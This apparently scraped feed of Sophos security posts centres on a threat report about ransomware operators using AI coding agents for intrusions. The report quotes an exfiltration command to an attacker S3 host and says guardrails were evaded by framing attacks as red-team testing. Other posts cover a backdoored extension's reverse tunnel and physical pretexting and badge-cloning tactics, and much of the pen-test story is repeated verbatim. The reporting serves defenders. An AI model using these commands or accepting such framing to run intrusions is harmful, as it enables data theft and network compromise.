item.title: AI used in Aur0ra ransomware testing and execution
item.description:
In May 2026, Counter Threat Unit™ (CTU) researchers published a report on an AI-orchestrated post-exploitation framework that tested the capabilities of multiple vendors’ endpoint detection and response (EDR) solutions, including the Sophos agent. Following a testing phase, Sophos analysts observed the same infrastructure hosting Cobalt Strike in support of Aur0ra ransomware (also known as Aurora ransomware) operations. Sophos analysis has revealed that the GOLD OGRE cybercriminal group, which operates Aur0ra ransomware, extensively uses AI to conduct attacks. The tools and tactics, techniques, and procedures (TTPs) observed by Sophos analysts align with third-party reporting of AI usage in similar compromises.

Sophos analysis

While investigating the exploitation framework, which was developed with Cursor AI assistance, Sophos analysts gained visibility that provided insights into the Aur0ra ransomware operation. They confirmed routine use of Cobalt Strike for intrusions, S3-compatible storage for storing stolen data, and agentic AI to escalate from credential access to privileged accounts. Sophos immediately notified potentially impacted customers and worked with law enforcement to issue notifications for other affected organizations.

The research data revealed multiple distinct operators, but each followed the same attack pattern. This pattern involved using shared command and control (C2) infrastructure and toolkits to perform Active Directory (AD) enumeration and lateral movement, focusing on network shares to collect data. For example, across multiple attacks, one operator conducted privilege escalation, process injection, credential/token abuse, extensive AD and share enumeration via SharpShares; collected the resulting data; and performed file-transfer activity consistent with staging and exfiltration to an S3 bucket:

VeeamTransport --endpoint-url hxxp://152[.]236[.]4[.]14:54410 ... cp ... s3://devhost/<redacted>/...

Artifacts discovered in the data suggest the operators are Russian speakers. Russian commands “зы” and “ды”, which were observed in the operator logs, correspond to ps (process enumeration) and ls (directory enumeration) when transposed from a Cyrillic keyboard layout.

In late August, Sophos analysts recovered Cursor artifacts associated with Aur0ra ransomware operations and EDR evasion testing. The threat actors used Cursor to escalate from credential access to domain administrator in preparation for data collection and ransomware deployment. AI guardrails were bypassed by framing the intrusions as authorized red team activity or "diagnostics testing". Intrusions were orchestrated by Cursor's Composer agentic coding model as well as AI models provided by Anthropic, xAI, and Moonshot. Analysis indicates that the threat actors initially used Anthropic almost exclusively but then introduced other models. The shift may be related to the threat actors’ objectives, as they transitioned from building tools to conducting intrusions.

Figure 1 shows the typical workflow. Human operators supplied VPN credentials, SOCKS access, targets, and objectives to the agents. The agents then performed network and AD discovery tasks, analyzed credential-based attack paths, executed commands, and moved laterally with limited human involvement. In several environments, the agents searched network shares, user documents, backup repositories, and cloud-connected storage while conducting password spraying, Kerberoasting, NTLM coercion and relay, and credential extraction from files and backups. In a subset of environments, agents achieved domain management access. Three of these victims were later named on Aur0ra’s data leak site.

Figure 1: AI-orchestrated intrusion workflow

Table 1 lists the original and English translations of some of the prompts observed by Sophos analysts during the investigation.

больше не пытайся брутить аккаунты доменных администраторов. пробуй другие, менее шумные способы и векторыDon't try brute-forcing domain administrator accounts anymore. Try other, less noisy, methods and vectors.
давай теперь получим по всей инфрастуктуре backup-серверы, nas-серверы, виртуализацию. в целом особо значимые endpointsNow let's enumerate across the entire infrastructure the backup servers, NAS servers, virtualization. Overall, the particularly significant endpoints.

Third-party reporting

In late August 2026, Gambit Security and CloudSEK published reports describing Aur0ra ransomware operations. Both analyses appeared to be based on access to the same exposed open directory at 172[.]86[.]113[.]245. The directory contained an attacker toolkit, including both Windows and Linux (ESXi-compatible) versions of the Aur0ra ransomware binary, shell history, and Cursor chat logs. The researchers described how Russian-speaking operators relied heavily on Cursor orchestration in exploitation activity. Gambit Security explicitly referenced the deployment of a Claude 4.5-Sonnet agent in semi-automated attacks.

After providing the agents with previously obtained credentials, the threat actors tasked the agents with various exploitation activities. The agents were given the freedom to select the tools and techniques best suited to specific objectives. When initial attempts failed, they refined their commands, modified scripts, and tried alternative approaches. Some tasks ultimately succeeded, while others ended with the agents summarizing their attempts and findings for the operators. Gambit described the agent using techniques and tools such as installing and configuring a VPN client and then connecting to the victim’s network via supplied credentials; using Nmap or NetExec to scan internal subnets for hosts; using BloodHound collector to enumerate the domain; attempting NTLM relay attacks via PetitPotam, Coerce Plus, and PrinterBug; using an Impacket module to relay the resulting authentication; and using Certipy to conduct certificate attacks. The tools and techniques described in the third-party reports overlap with the ones that Sophos analysts observed in the AI-orchestrated evasion testing framework (see Figure 2). Infrastructure crossovers were much more limited. Just one SOCKS-related IP address (45[.]59[.]113[.]63) was observed in the AI-orchestrated testing framework and mentioned in Gambit Security’s report.

Figure 2: Comparison between tools and techniques observed in AI-orchestrated testing framework and referenced in third-party reporting on Aur0ra ransomware operations

CTU™ researchers assess with high confidence that GOLD OGRE used AI to test the evasion capabilities of various tools and techniques in a Cursor-enabled endpoint testing framework, and then provided associates with similar technology to use in Aur0ra ransomware operations. It is highly likely that other ransomware groups and their affiliates will embed AI agents like Cursor into their operations as well.

Recommendations

AI can accelerate phases of the attack chain and reduce the level of technical aptitude needed to conduct an attack. Existing controls such as patching internet-facing devices, deploying phishing-resistant multi-factor authentication (MFA), and monitoring EDR alerts are still effective, but successful defense relies on a quick response. Organizations should also prioritize controls that reduce attackers’ movements within an environment. These controls include segmenting critical servers, isolating backups, reviewing domain administrator privileges, using privileged access management (PAM), and implementing application controls.

item.title: Physical Penetration Testing: When Human Trust Bypasses Layers of Security with a Simple Pretext
item.description:
This article is part of an ongoing series from Sophos frontline security operations specialists, sharing the expertise they use to strengthen our industry-leading Managed Detection and Response (MDR) service and defend customers against evolving AI-era threats.

Every physical penetration test starts with the same quiet hope: that somewhere, between the polished lobby, the badge readers, the CCTV domes, and the confident hum of office life, there is a tiny gap no one has noticed.

This one had plenty of impressive controls. Badge readers. PIN pads. Security gates. Mantraps. Reception. Guards. Cameras. The sort of layered setup that makes people feel safe enough to stop thinking about it.

And that, as it turned out, was the real vulnerability.

The first plan was straightforward: capture a badge at the entrance. Nothing dramatic. Just stand close enough, blend into the commuter traffic, and let the technology do the work. We had the gear, the timing, and the patience. What we did not have was the right antenna for the particular flavor of legacy badge in use. After a few hours of walking loops, loitering politely, and pretending a laptop bag was just a laptop bag, it became clear that the clean technical approach was not going to be the way in.

So the plan changed.

If technology would not open the door, maybe people would.

That evening, we spent time watching the rhythm of the building. Every office has one. The early arrivals. The smokers. The coffee runners. The cleaners. The people who hold doors because they are decent human beings and because nobody wants to be the awkward person who says, “Sorry, who are you?”

We needed a believable reason to be at a secured entrance before the workday started. The answer came in the form of a simple maintenance pretext: one consultant dressed like a badge-reader technician, the other like a familiar employee type, smart outfit, branded-looking clothing, calm demeanor, and just enough confidence to make the story feel boring.

Boring is powerful. Nobody wants to get involved in boring.

Before sunrise, we were waiting near the entrance. The building was quiet in that strange early-morning way: too clean, too still, the kind of silence where every elevator ding sounds louder than it should. Eventually, the cleaning crew arrived with their trolley. We explained that the badge reader had been misbehaving and that we needed them to test their access.

The door opened.

For a brief moment, everyone looked surprised, including us, although we tried very hard not to show it. The trolley rolled forward, the door stayed open, and the first layer was behind us.

Then came the second layer: a security gate.

It was badge-controlled, which was inconvenient. But it also had a generous gap underneath, which was very convenient.

So, at an hour when most people were still asleep, two grown professionals in carefully chosen outfits crawled under a security gate and into a corporate office.

Not glamorous. Very effective.

Once inside, the atmosphere changed immediately. Outside, the building had felt like a fortress. Inside, it felt like any other office before business hours: desks, chairs, monitors, paper trays, meeting rooms, kitchen areas, and little islands of human habit scattered everywhere.

And that is where the real story began.

Sensitive documents were left out. Drawers were unlocked. Filing cabinets were accessible. Keys were sitting where keys should never sit. Confidential waste processes existed, but the evidence suggested they were not consistently followed. Workstations were left unlocked. Laptops were unattended. Access badges were sitting on desks like coasters.

The physical controls at the perimeter had created a strong first impression, but once that perimeter was crossed, the office trusted us almost completely.

We booked a meeting room and used it as a base. This is one of those tricks that feels absurdly simple: if you have a room, a laptop, and the confidence of someone who knows where the coffee machine is, people mentally file you under “probably supposed to be here.” From there, we took turns walking the floors, observing habits, checking exposed information, and learning how the office actually behaved when nobody thought anything unusual was happening.  

Some things went well for the defenders. The USB drive that we dropped was found and returned rather than plugged in. Reception challenged our suspicious stories. A fake contractor pretext was checked and rejected. A security guard escalated our after-hours presence instead of casually accepting it. These were good moments, the kind that prove awareness training can work when people slow down and verify. 

But other moments told a different story.

During lunch, badges were left behind on desks. A brisk walk was taken and for each badge, a small device was used to make contact and clone them within seconds. One of the badges later opened the door to a sensitive technical room. Suddenly, a plastic card forgotten beside a keyboard had become a key to critical infrastructure.

There was also the network port.

After hours, we went hunting for exposed Ethernet access. Most ports behaved properly, which was encouraging. Then one did not. A single misconfigured port gave us network access. From there, it was possible to capture encrypted authentication material and recover a user password offline. That was the moment the engagement shifted from “physical access risk” to “physical access can become logical compromise very quickly.”

To the organization’s credit, this activity did not go entirely unnoticed. The security operations team detected unusual activity and escalated it. That matters. Prevention had gaps, but detection showed signs of life.

Still, the most memorable part of the engagement was not the badge cloning, the server room, or the network access.

It was the day we decided to act suspiciously on purpose.

We moved furniture. Raised desks. Opened floor traps. Sat on the ground with short Ethernet cables. Walked into areas we should not have been in. Entered a sensitive room using a cloned badge. We made ourselves visible enough that someone could have asked a very simple question:

“Can I help you?”

No one did.

That question might be the cheapest security control in the building.  

Later, we tested a basement storage room. The door looked solid, but the gap underneath made it vulnerable to an under-door tool. The process was noisy, awkward, and not exactly subtle. People passed nearby. Nobody asked why two people were on the floor working at the bottom of a locked door. Eventually, the door opened.

Inside and nearby, another lesson appeared in shredded paper. The documents had been shredded, yes - but into strips long enough that words and numbers were still readable. It was a perfect metaphor for the whole engagement: the control existed, but the implementation did not fully solve the risk.

Finally, there was the QR code poster.

A harmless-looking seasonal poster was placed near the office, inviting people to vote on festive photos. It contained a tracking QR code. By the next morning, it had been scanned multiple times before someone removed it.

That small campaign summed up social engineering nicely. Curiosity is not a bug in people; it is a feature. Security programs have to account for it.

By the end of the week, the story was clear. The organization had invested in serious physical security, and several employees did exactly the right thing when challenged with suspicious situations. But security is not only about strong doors and badge readers. It is also about what happens after the door opens.

A badge left on a desk can become server room access.

An unlocked workstation can become data exposure.

A single network port can become domain visibility.

A strip shredder can become readable confidential waste.

A friendly habit of holding doors can become an intrusion path.

And a quiet failure to ask “Who are you?” can make all the expensive controls feel optional.

The takeaway is not that physical security failed completely. It did not. Some controls worked. Some people made excellent decisions. Detection eventually noticed part of the activity.

The takeaway is that layered security only works when every layer is alive: technology, process, people, and culture.

Because sometimes the attacker does not smash a window, pick a lock, or hack the badge system.

Sometimes they arrive early, wear the right outfit, tell a boring story, and crawl under the gate.

Want to know whether anyone in your office would ask “Can I help you?” Sophos Red Team has delivered thousands of offensive security engagements, and our Security Services Retainer lets you draw on everything from Offensive Security Services to DFIR & Readiness Services with the flexibility to pivot whenever your priorities change. We're happy to help.  If you enjoyed this real-world engagement story you will not want to miss this ~2 minute video about a recent bank heist.

So, at an hour when most people were still asleep, two grown professionals in carefully chosen outfits crawled under a security gate and into a corporate office.

Not glamorous. Very effective.

Once inside, the atmosphere changed immediately. Outside, the building had felt like a fortress. Inside, it felt like any other office before business hours: desks, chairs, monitors, paper trays, meeting rooms, kitchen areas, and little islands of human habit scattered everywhere.

And that is where the real story began.

Sensitive documents were left out. Drawers were unlocked. Filing cabinets were accessible. Keys were sitting where keys should never sit. Confidential waste processes existed, but the evidence suggested they were not consistently followed. Workstations were left unlocked. Laptops were unattended. Access badges were sitting on desks like coasters.

The physical controls at the perimeter had created a strong first impression, but once that perimeter was crossed, the office trusted us almost completely.

We booked a meeting room and used it as a base. This is one of those tricks that feels absurdly simple: if you have a room, a laptop, and the confidence of someone who knows where the coffee machine is, people mentally file you under “probably supposed to be here.” From there, we took turns walking the floors, observing habits, checking exposed information, and learning how the office actually behaved when nobody thought anything unusual was happening.  

Some things went well for the defenders. The USB drive that we dropped was found and returned rather than plugged in. Reception challenged our suspicious stories. A fake contractor pretext was checked and rejected. A security guard escalated our after-hours presence instead of casually accepting it. These were good moments, the kind that prove awareness training can work when people slow down and verify. 

But other moments told a different story.

During lunch, badges were left behind on desks. A brisk walk was taken and for each badge, a small device was used to make contact and clone them within seconds. One of the badges later opened the door to a sensitive technical room. Suddenly, a plastic card forgotten beside a keyboard had become a key to critical infrastructure.

There was also the network port.

After hours, we went hunting for exposed Ethernet access. Most ports behaved properly, which was encouraging. Then one did not. A single misconfigured port gave us network access. From there, it was possible to capture encrypted authentication material and recover a user password offline. That was the moment the engagement shifted from “physical access risk” to “physical access can become logical compromise very quickly.”

To the organization’s credit, this activity did not go entirely unnoticed. The security operations team detected unusual activity and escalated it. That matters. Prevention had gaps, but detection showed signs of life.

Still, the most memorable part of the engagement was not the badge cloning, the server room, or the network access.

It was the day we decided to act suspiciously on purpose.

We moved furniture. Raised desks. Opened floor traps. Sat on the ground with short Ethernet cables. Walked into areas we should not have been in. Entered a sensitive room using a cloned badge. We made ourselves visible enough that someone could have asked a very simple question:

“Can I help you?”

No one did.

That question might be the cheapest security control in the building.  

Later, we tested a basement storage room. The door looked solid, but the gap underneath made it vulnerable to an under-door tool. The process was noisy, awkward, and not exactly subtle. People passed nearby. Nobody asked why two people were on the floor working at the bottom of a locked door. Eventually, the door opened.

Inside and nearby, another lesson appeared in shredded paper. The documents had been shredded, yes - but into strips long enough that words and numbers were still readable. It was a perfect metaphor for the whole engagement: the control existed, but the implementation did not fully solve the risk.

Finally, there was the QR code poster.

A harmless-looking seasonal poster was placed near the office, inviting people to vote on festive photos. It contained a tracking QR code. By the next morning, it had been scanned multiple times before someone removed it.

That small campaign summed up social engineering nicely. Curiosity is not a bug in people; it is a feature. Security programs have to account for it.

By the end of the week, the story was clear. The organization had invested in serious physical security, and several employees did exactly the right thing when challenged with suspicious situations. But security is not only about strong doors and badge readers. It is also about what happens after the door opens.

A badge left on a desk can become server room access.

An unlocked workstation can become data exposure.

A single network port can become domain visibility.

A strip shredder can become readable confidential waste.

A friendly habit of holding doors can become an intrusion path.

And a quiet failure to ask “Who are you?” can make all the expensive controls feel optional.

The takeaway is not that physical security failed completely. It did not. Some controls worked. Some people made excellent decisions. Detection eventually noticed part of the activity.

The takeaway is that layered security only works when every layer is alive: technology, process, people, and culture.

Because sometimes the attacker does not smash a window, pick a lock, or hack the badge system.

Sometimes they arrive early, wear the right outfit, tell a boring story, and crawl under the gate.

item.title: Malicious Claude Code extension distributed through Cursor marketplace
item.description:
On October 29, 2026, Cursor reported that a malicious version of Anthropic’s Claude Code extension (2.1.313) was available in the Cursor extension marketplace between approximately 09:27 and 20:35 UTC. Cursor identified impacted macOS and Windows packages and estimates that up to 5,000 users were affected.

Analysis by Phorion revealed that the extension adds an attacker-controlled SSH key to authorized_keys, attempts to open a reverse SSH tunnel to 134.209.82[.]225, establishes persistence, and sends host details to the attacker. Due to coding errors, SSH enablement fails on most macOS and Windows hosts.

Recommended actions

Sophos X-Ops recommends that organizations identify hosts running Cursor and check if version 2.1.313 was installed during the exposure window. Uninstalling the extension leaves the backdoor in place, so organizations need to remove the SSH key, persistence mechanisms, and tunnel processes from the affected host, and rotate accessible credentials.

Sophos countermeasures

SophosLabs continues to monitor the threat landscape for activity related to this threat and will deliver detections and protections as available.

In addition, Sophos is searching customer telemetry for reported indicators and using Sophos AI Defense to identify internal devices that have Cursor installed.

item.title: What happens when a fake coding test reaches a security company?
item.description:
An established technique

Developers are attractive targets. Their laptops and accounts often reach source code, build systems and production infrastructure, so attackers put real effort into getting onto them. Fake recruitment is one of the most established ways to do it: the attacker poses as an employer, runs a plausible interview process, then asks the candidate to download and run a coding assignment.

The technique is in the news this week after Binance's $6.3 billion theft, which began with a job interview. According to Binance, a software engineer was approached in September through a legitimate job platform and told to download a coding assignment onto his work computer. The FBI has attributed the attack to North Korea.

Our close call

In September, an industry partner tipped us off through an intelligence-sharing channel: one of our employees' Macs had been compromised. The day before a similar lure reached one of our employees, and the employee had opened a GitHub "coding assignment" in VS Code. A command hidden in the workspace settings ran as soon as a terminal opened, and within two minutes the BeaverTail loader and InvisibleFerret backdoor were running. To be clear, we’re not suggesting this was necessarily the exact malware used at Binance. The broader concern is that employment-themed social engineering is used by multiple North Korean threat groups. So this isn’t an isolated trick associated with one campaign, but part of a wider and well-established playbook.

An external tip-off is a gift, but it's also very uncomfortable. By the time one arrives, most of your other controls have already failed. Ours failed for a mundane reason: the Mac's endpoint agent was broken. Unprotected assets are one of the most common and least glamorous failure points we see across our customer base. This time it impacted us.

We routinely publish root cause analysis for incidents like this one. See INC-2026-002 for more details on the attack and our corrective actions.

A similar lure, a different attack

Both attacks abused trusted developer tooling. Ours used a VS Code workspace feature and a handful of scripts. According to Binance, its attacker swapped the legitimate pyenv component in the engineer's Homebrew installation for a malicious version, used it to contact an attacker-controlled server, and cleaned up traces as it went. Binance says its endpoint tools didn't detect that malware. Our endpoint protection already detected the payload used against us: SophosLabs confirmed that the first script dropped on the Mac was already detected as Troj/Dloadr-EJE. A working agent would have stopped the chain.

What to do about it

We'd suggest three things.

Find the endpoints that have gone quiet. We already had device-compliance checks and endpoint coverage monitoring in place, but this incident showed a gap between them. Correlating identity sign-in data with endpoint telemetry closed it: a device that's still signing in but not reporting to your endpoint console is a coverage gap. Joining those views up surfaced devices that passed identity and device-management compliance but weren't reporting to our corporate console.

It's worth noting that we found a long tail of edge cases that stopped this data joining up cleanly (some unique to Sophos, such as the way we test beta versions of our endpoint internally). This complexity had thwarted previous reconciliation attempts, but this time, with the help of an AI agent, we were able to work through the messy bits far more efficiently. Tackling some of the historic complexity allowed us to tighten our device-management compliance checks to prevent a recurrence. The investigation informed a proposed detection for this kind of visibility gap.

Treat North Korea's targeting of IT staff as one threat. A year ago we published our CISO playbook on North Korean IT workers. It includes a control matrix, an implementation guide and training slides, all built from our own hiring controls and CTU research. The playbook focuses on keeping fraudulent hires out. Fake interviews run the same scheme in reverse. Instead of posing as a candidate to get inside your company, the attacker poses as an employer to get onto your employee's laptop. The investigation also informed a proposed detection for this kind of visibility gap.

Many controls overlap: identity verification, least privilege, monitoring for unauthorized remote access tools, and endpoints that actually work. As the Binance incident highlights, defending against compromised developer devices is challenging but critical. At Sophos, one of our principal risks focuses on ensuring we have a strong "firebreak" between our corporate and product environments. Our threat model considers compromise of both privileged developer and IT sysadmin endpoints or identities.

Scope what your AI tools can reach. Binance’s attacker used an internal AI tool to move from one engineer to two others. Whether a tool is misused by prompt injection or by a compromised user, the defence is the same: assume the AI layer will be breached and contain what it can reach. We set out seven patterns for doing that in our lethal trifecta blog, including credential isolation, sealed tool endpoints and human approval for irreversible actions.

A state-sponsored criminal enterprise

North Korea is an unusual state actor. Most state-sponsored groups steal secrets. North Korea also steals money, at scale, to fund the regime. Chainalysis estimates it stole $2.02 billion in cryptocurrency in 2025, most of it from the $1.5 billion Bybit heist. The Binance attack alone is roughly three times that figure.

It also innovates like a startup. Sophos Counter Threat Unit (CTU) researchers track several overlapping North Korean groups:

  • NICKEL ALLEY runs the Contagious Interview campaign: fake companies, fake recruiters and malicious code repositories, plus ClickFix lures and poisoned npm packages. The VS Code technique used against us matches its tradecraft.
  • NICKEL TAPESTRY runs the fraudulent IT worker scheme. It has been active since at least 2016, is expanding into Europe and Japan, uses generative AI to build fake CVs and has turned to data-theft extortion.
  • NICKEL GLADSTONE is a financially focused subgroup that has targeted cryptocurrency exchanges since at least 2018, including through TraderTraitor, the name the FBI has linked to the Binance attack.

A September joint advisory from Japan's National Police Agency, the FBI and partners puts the scale in perspective. Between December 2025 and July 2026, the Contagious Interview actors (which the advisory calls WaterPlum) compromised at least 30,000 devices in more than 100 countries and took funds or credentials from over 7,000 cryptocurrency wallets. The advisory also found that they and some North Korean IT workers sit under the same government bureau.

The common thread is the target: IT people. Developers, DevOps engineers and administrators hold the keys, and North Korea has learned that the job market is the easiest way to reach them. The attackers who hit Binance needed one engineer's laptop. So did the attackers who targeted us. The difference was what that laptop could reach, and how quickly someone noticed.

item.title: Securing the AI-era network: Why performance and defense now belong together
item.description:
AI doesn’t operate in isolation. Its prompts, workflows, data exchanges, and API calls all depend on the network. As organizations put AI to work, it adds a new layer of traffic that is increasingly encrypted, application-driven, and machine-to-machine. 

Attackers are using AI too, helping them find weaknesses and act on them faster. The vulnerability you haven’t patched, the unsupported device you’ve forgotten about, or the management interface exposed to the internet can be discovered and exploited sooner. AI is narrowing the gap between exposure and attack. 

The network connects the users, devices, applications, cloud services, workloads, and AI systems that keep your organization running. That makes it one of the first places risk becomes visible and one of the fastest places to act. But only if the network has the performance to inspect demanding traffic, the visibility to recognize suspicious activity, and the ability to coordinate a response. 

Four pressures reshaping today’s networks 

The challenges will be familiar to most IT and security teams. AI is increasing their scale, speed, and operational impact: 

  • More demanding traffic. Encrypted, application-rich, and AI-enabled activity requires more inspection capacity. If the firewall becomes a bottleneck, organizations can be forced to choose between stronger protection and acceptable performance. 
  • Faster-moving threats. AI can accelerate reconnaissance, vulnerability discovery, exploitation, and other stages of an attack, reducing the time defenders have to respond. 
  • More blind spots. Distributed users, contractors, unmanaged and IoT devices, cloud services, and unsanctioned AI tools make it harder to see what is connected and govern how it is used. 
  • Less time to respond. Disconnected tools, incomplete context, and manual handoffs make it harder to contain threats before they spread. 

Performance and protection can no longer be planned separately 

This is not a reason to slow AI adoption. It is a reason to reconsider an old network trade-off. Organizations should not have to choose between supporting innovation and maintaining strong protection. Securing the AI-era network requires: 

  • Protected performance: enough capacity to inspect encrypted and application-rich traffic with the necessary protections enabled, without slowing the business down. 
  • Connected defense: network visibility and signals that strengthen investigation and response, helping security teams recognize and contain threats before they spread. 

Three questions to ask about your network 

Securing the AI-era network is not simply a matter of buying a faster firewall. It means planning performance, visibility, and response together. 

1. Can your network maintain performance with protection enabled? 

Headline throughput tells only part of the story. Capacity planning should reflect the TLS inspection, threat prevention, application control, and other protections you expect to keep switched on. 

2. Can you see beyond traditional network boundaries? 

Users, contractors, SaaS applications, unmanaged devices, and AI services all contribute to your exposure. Your visibility needs to extend across the environments where work now happens. 

3. Can network activity trigger a coordinated response? 

A network anomaly becomes more valuable when your team can investigate it alongside endpoint, identity, application, and threat context, then take action before the threat spreads. 

The goal is a network that can see what is connected, understand what is happening, maintain protection without compromising performance, and help stop threats before they spread. 

How Sophos is helping secure the AI-era network 

Sophos Fusion provides the foundation for our connected approach to cybersecurity, bringing Sophos products, services, and security intelligence together to help organizations see more, understand more, and respond faster. For the network, that means connecting protection, visibility, and context across the places where users, devices, applications, and data come together. 

The latest Sophos network security innovations build on that foundation: 

  • Sophos Firewall provides protection and control at key network boundaries. 
  • Sophos NDR extends visibility and response deeper into the network. 
  • Sophos Workspace Protection helps secure access wherever work happens. 
  • Sophos Wireless and Sophos Switch add visibility into connected devices and network segments. 

Together, they extend the Sophos Fusion story into the network, helping organizations maintain performance, reduce blind spots, and respond faster. 

Sophos Firewall v23: More control with less operational effort 

Sophos Firewall v23 helps organizations improve visibility, simplify administration, and strengthen resilience. It includes more than 30 enhancements, many based directly on customer and partner feedback. 

  • See and control AI use. Integration with Sophos AI Defense adds network-level visibility, reporting, and policy enforcement for AI services. 
  • Simplify firewall administration. The AI Assistant turns plain-language requests into proposed firewall rules that remain disabled until an administrator reviews and enables them. Redesigned rule management and an updated REST API make day-to-day administration and automation easier. 
  • Improve resilience. Faster high-availability failover, visible hotfix status, firmware update scheduling, and DNS over HTTPS help organizations maintain protection and availability. 
  • Protect more users and applications. Support for Microsoft Entra ID and Google identity providers, together with increased Web Application Firewall scale, helps protect larger and more diverse environments. 

Learn more about Sophos Firewall v23 

New XGS 1U firewall appliances: More performance. More choice. 

We’re also adding four new models to the XGS 1U range: the XGS 2380, XGS 3380, XGS 4580, and XGS 5580. They give mid-sized and distributed organizations more options on price and performance: 

  • Keep inspection switched on as traffic grows. Major gains in threat protection and TLS inspection performance, up to four times higher than comparable existing models, give you room to decrypt and protect growing volumes of encrypted traffic. 
  • Get more from every watt. Two purpose-built Xstream FastPath designs improve performance per watt, helping lower operating costs over the life of the appliance. 
  • Support higher-speed connectivity. 2.5G interfaces come on every new model, with up to 25G fiber on the XGS 3380 and above. 
  • Reduce downtime. Field-replaceable SSDs mean only a faulty drive needs to be returned, while the appliance stays in the rack. Improved internal redundant power options add further resilience. 

The new models expand the XGS range rather than replacing the existing appliances. The right choice depends on the protected performance, connectivity, resilience, and growth headroom your organization needs. Your Sophos partner can help you choose and size the right model for your environment. 

Xstream Plus: Expand protection with one firewall license 

Xstream Plus is a new Sophos Firewall term license for organizations that need more than network-edge protection alone. It includes everything in our most popular subscription bundle, Xstream Protection, together with: 

  • a model-specific allocation of Sophos Workspace Protection licenses 
  • Enhanced Plus Support 
  • up to one year of Sophos Fusion Firewall Reporting data retention, depending on traffic volume 

This gives organizations a simpler way to extend secure access and browser-based controls to remote and hybrid users, strengthen support for business-critical deployments, and retain reporting data longer for investigations, trend analysis, and compliance needs. 

Sophos NDR: Find and stop threats beyond the firewall 

Not every threat crosses a firewall, and not every device can run an endpoint agent. Now available as a standalone solution, Sophos NDR analyzes network activity to identify suspicious behavior across managed, unmanaged, IoT, and other agentless devices. It combines AI- and machine learning-powered behavioral detection with deep packet inspection and IDS/IPS capabilities. 

  • Reveal activity other controls may miss. Detect suspicious behavior and lateral movement across managed, unmanaged, and agentless devices. 
  • Disrupt malicious activity in real time. In Active Inline mode, Sophos NDR can drop identified malicious packets before they reach their target. 
  • Deploy it to suit your network. Choose virtual deployment, compatible third-party hardware, or a purpose-built Sophos NDR appliance, with Active Inline, Passive Inline, and SPAN/TAP options. 
  • Investigate with broader context. Bring NDR detections and network context into Sophos Fusion alongside information from other Sophos defenses. 

Sophos NDR works alongside Sophos Firewall to provide a more complete view of the network. Sophos Firewall controls traffic at key network boundaries, while Sophos NDR analyzes activity inside the network to identify threats that boundary controls may not see. Both contribute network context through Sophos Fusion. 

Sophos Workspace Protection: Secure access wherever work happens 

Sophos Workspace Protection helps secure how users access web, SaaS, private applications, and AI tools from anywhere, including from unmanaged contractor and BYOD devices. A model-specific allocation of Sophos Workspace Protection licenses is included with Xstream Plus, giving organizations a straightforward way to extend secure access and browser-based controls beyond the office. 

As we connect more Sophos solutions, customers will be able to apply protection more consistently across the network, endpoint, and workspace. New synchronized web policies are an important step in that direction. Administrators can configure web filtering in Sophos Fusion and apply it across Sophos Firewall and Sophos Endpoint. 

A Generative AI web category adds control over which AI services users can access, helping organizations allow approved tools, block unsanctioned services, and reduce the risk of sensitive information being shared inappropriately. Additional policy support for Sophos Protected Browser and Sophos DNS Protection is planned for future releases. 

We’re also extending this connected approach to AI security. Integration between Sophos Workspace Protection and Sophos AI Defense is planned to bring additional visibility and control to how organizations use AI services. 

A more connected view of network risk 

Each solution contributes a different part of the picture. Sophos Firewall provides visibility and control at key boundaries. Sophos Wireless and Sophos Switch show what is connected and where. Sophos NDR identifies suspicious activity inside the network, including on devices that cannot run an agent. Sophos Workspace Protection extends secure access and browser-based controls to users wherever they work. 

Sophos Fusion brings more of this context together, helping security teams investigate activity across the network and coordinate a faster, better-informed response. Instead of treating each network signal in isolation, teams can use it as part of a broader view of risk. 

Prepare the network for what comes next

item.title: The State of Ransomware in Financial Services (2026)
item.description:
Attack vectors concentrated on identity

Identity-based vectors, including malicious email, phishing, compromised credentials, and brute force, initiated 85% of attacks against financial services. This was one of the highest rates for any sector and well above the 79% cross-sector rate for identity-based initial vectors.

Malicious email and compromised credentials tied as the leading technical root cause at 26%, with phishing close behind at 23%. Exploited vulnerabilities dropped to 12%, down from 40% last year.

While brute-force attacks were a low occurrence root cause across all sectors, financial services was the most likely sector to be breached by a brute force attack (10%, versus 6% across all sectors).

The sector was breached through gaps it already knew about

44% of financial services victims attributed their breach to a known security gap, a weakness they were aware of but had not addressed. That was the highest rate of any sector and eight points above the 36% cross-sector rate for known security gaps.

Unknown gaps were close behind at 41%, and combining the two, roughly 69% cited a security gap of some kind. Lack of protection followed at 40%. The report compares each operational root cause with the cross-sector average.

Double extortion keeps climbing

59% of attacks on financial services providers succeeded in encrypting data, close to the 56% cross-sector rate and unchanged from last year. What shifted was the mix: attacks that encrypted data and also stole it rose to 21%, up from 18% in 2025 and 16% in 2024. That second point of leverage is costly in a heavily regulated sector.

Luckily, financial services were better prepared for recovery with 75% restoring data from backups, which was better than the 66% cross-sector rate and a sharp rebound from only 44% using backups last year.

A higher floor on ransoms, but deeper discounts

Financial services faced steeper demands: a median of $1 million versus the $698,000 cross-sector median, and 53% of demands were for $1 million or more. Payments were also high, with a median of $1.07 million against the $769,000 cross-sector median.

Both of those medians, however, were lower than last year’s medians. The median demand fell from $3 million in 2025, and the median payment continued a two-year decline from $2.2 million in 2024.

The report covers how well the financial services was able to negotiate ransomware payments.

Costs eased, but recovery did not

The average (mean) recovery cost, excluding any ransom paid, was $1.50 million, down from $1.74 million last year and below the $1.70 million cross-sector average.

The median tells a different story at $750,000, double the $375,000 overall median. The sector has a higher floor and a lower ceiling: fewer cheap recoveries, but no ruinous ones either. You can find out how long post-ransomware attack recovery timelines were for the financial services sector in the full report.

Defenses saw the attack, but did not stop it

Almost all financial services victims of credential-based attacks had MFA enabled (96%), yet 70% were still encrypted. Firewalls flagged 48% of attacks before the ransomware deployed, but even with early indicators, victims were encrypted 53% of the time. 

Controls are collecting the right signals but they’re not connecting deeply enough with other tools and responding together. The report contains several key recommendations based on this year’s data, and one of those recommendations is to adopt a defense system posture where identity, email, endpoint, and network controls respond as one.

Read the report

The financial services sector is paying attackers less and recovering from backups more, but it is recovering slower and carrying a heavier human cost than almost any other sector. Closing known gaps and connecting existing defenses is the highest-leverage place to invest.

Download the free report for the full findings, sector comparisons, and recommendations.

item.title: SIEM or XDR? Yes
item.description:
In my last blog, I asked where XDR fits into the SIEM-less conversation. To answer that, start with the endpoint. If every threat could be stopped there, there would be less need for detection and response products such as endpoint detection and response (EDR). But attackers got better at evading even the most robust endpoint security, for example by abusing dual-use tools in living-off-the-land (LOTL) attacks. That forced the industry to pivot toward a “collect data and analyze” approach, which is the entire premise behind EDR and where the SIEM-versus-XDR story begins.
